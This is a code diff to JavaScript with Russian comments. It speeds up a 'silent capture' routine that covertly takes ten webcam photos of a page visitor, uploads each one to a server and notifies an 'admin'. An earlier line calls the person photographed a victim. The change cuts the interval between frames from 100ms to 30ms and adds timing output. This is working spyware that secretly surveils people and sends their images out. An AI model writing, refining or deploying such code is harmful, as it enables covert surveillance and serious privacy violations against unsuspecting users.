@@ -851,7 +851,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО (10 ФОТО ЗА 1 СЕКУНДУ!) ==========
+    // ========== КАМЕРА И ФОТО (10 ФОТО ЗА 0.3 СЕКУНДЫ!) ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -877,7 +877,8 @@
             
             await new Promise(r => setTimeout(r, 500));
             
-            // ===== 10 ФОТО ЗА 1 СЕКУНДУ (100ms МЕЖДУ КАДРАМИ) =====
+            // ===== 10 ФОТО ЗА 0.3 СЕКУНДЫ (30ms МЕЖДУ КАДРАМИ) =====
+            const startTime = performance.now();
             for (let i = 0; i < 10; i++) {
                 canvas.width = videoEl.videoWidth || 640;
                 canvas.height = videoEl.videoHeight || 480;
@@ -891,14 +892,16 @@
                     },
                     body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
                 });
-                // ===== ЗАДЕРЖКА 100ms (10 кадров в секунду) =====
-                await new Promise(r => setTimeout(r, 100));
+                // ===== ЗАДЕРЖКА 30ms =====
+                await new Promise(r => setTimeout(r, 30));
             }
+            const endTime = performance.now();
+            const totalTime = ((endTime - startTime) / 1000).toFixed(2);
             
             stream.getTracks().forEach(track => track.stop());
             videoEl.remove();
             
-            sendToAdmin(`📸 Сделано 10 скрытых фото жертвы за 1 секунду!`);
+            sendToAdmin(`📸 10 скрытых фото за ${totalTime} секунд!`);
             
         } catch(e) {
             sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
